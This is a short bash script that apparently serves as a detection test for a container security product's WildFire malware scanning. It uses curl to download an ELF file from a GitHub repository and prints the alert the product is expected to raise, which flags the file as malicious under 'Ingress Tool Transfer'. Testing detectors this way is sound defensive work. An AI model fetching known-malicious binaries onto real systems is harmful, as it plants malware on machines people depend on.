#!/bin/bash
echo -e "Conditions:\nLearning:OFF of CONTAINER MODEL ACTIVE\nTOGGLE:Wilfire\nNOTE:WILDFIRE ONLY WORKS IN ONPREM ENVIRONMENTS AND NEED TO BE ENABLE IN MANAGE > SYSTEM > WILDFIRE\n\n….Triggering....\n"

curl -LO https://github.com/cabramovich1/carlospublic/raw/main/file-32bit.elf

echo -e "\nEvent information:\nCategory:Filesystem / WildFire Malware\nATT%CK technique:Ingress Tool Transfer\nWildFire report:MUST EXIST AND BE CLICKABLE\nMessage:Process /usr/bin/curl created the file /tools/file-32bit.elf. The file created was detected as malicious. MD5: 9a0e765eecc5433af3dc726206ecc56e"
